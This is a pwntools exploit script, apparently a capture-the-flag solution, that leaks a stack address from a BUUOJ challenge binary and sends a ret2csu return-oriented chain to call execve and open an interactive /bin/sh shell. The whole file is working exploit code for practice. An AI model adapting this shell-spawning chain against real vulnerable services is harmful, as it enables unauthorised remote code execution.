from pwn import *

#sh=process("./timu")
sh=remote("node4.buuoj.cn",29039)
elf=ELF("./timu")

vuln=p64(0x00000000004004ED)
csu_last=p64(0x000000000040059A)
csu_former=p64(0x0000000000400580)
execve=p64(0x00000000004004E2)
pop_rdi_ret=p64(0x00000000004005a3)
syscall=p64(0x0000000000400501)

payload=b"/bin/sh\x00".ljust(0x10,b'a')+vuln
sh.send(payload)
sh.recvn(0x20)
#print("recv =",sh.recv())
stack_addr=u64(sh.recv(8))
print("stack =",stack_addr)
bin_sh=stack_addr-0x118  #when process,the number is 0x148

payload=b'/bin/sh\x00'.ljust(0x10,b'a')+csu_last+p64(0)*2+p64(bin_sh+0x50)+p64(0)*3+csu_former+execve+pop_rdi_ret+p64(bin_sh)+syscall
sh.send(payload)
sh.interactive()
